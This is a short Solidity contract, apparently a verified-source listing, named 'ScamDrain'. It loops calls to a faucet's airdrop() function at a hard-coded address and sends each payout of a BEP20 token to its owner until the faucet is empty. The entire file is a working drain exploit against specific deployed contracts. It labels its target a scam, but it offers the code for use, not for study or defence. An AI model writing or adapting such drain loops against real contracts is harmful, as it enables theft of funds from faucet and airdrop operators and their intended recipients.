/**
 *Submitted for verification at Etherscan.io on 2021-06-21
*/

/**
 *Submitted for verification at BscScan.com on 2021-06-21
*/

pragma solidity >=0.7.0 <0.9.0;


contract ScamDrain {

    address public constant FAUCET_ADDRESS = 0x0cE2843c1dB90474760651E96a7717aBf9442256;
    address public constant SCAM_ADDRESS = 0x51Ea02C339c6cd4DFEB64449da5341627d1E97Bb;
    
	address owner_;
	
    constructor() {
        owner_ = msg.sender;
    } 
    
    function drain() public {
        ScamFaucet faucet = ScamFaucet(FAUCET_ADDRESS);
        
        BEP20 scamtoken = BEP20(SCAM_ADDRESS);
		
		uint256 airdropsize = faucet.airdropSize();
		uint256 balance = scamtoken.balanceOf(FAUCET_ADDRESS);
		require(balance >= airdropsize, "NOT FUNDED");
		
        do {
            //airdrop to this contract
            faucet.airdrop();
            //send from this contract to the caller
            scamtoken.transfer(owner_, airdropsize);
            
            //repeat until faucet is no longer funded
            balance = balance - airdropsize;
        } while (balance >= airdropsize);
    }
}

abstract contract ScamFaucet {
    uint256 public airdropSize;
    
    function isFaucetFunded() virtual external view returns(bool);
    function canAddressReceive(address adr) virtual public view returns(bool);
    function airdrop() virtual public ;
}

abstract contract BEP20 {
    
    
    function balanceOf(address tokenOwner) virtual external view returns (uint256);
    function transfer(address receiver, uint256 numTokens) virtual public returns (bool);
    function totalSupply() virtual external view returns (uint256);
}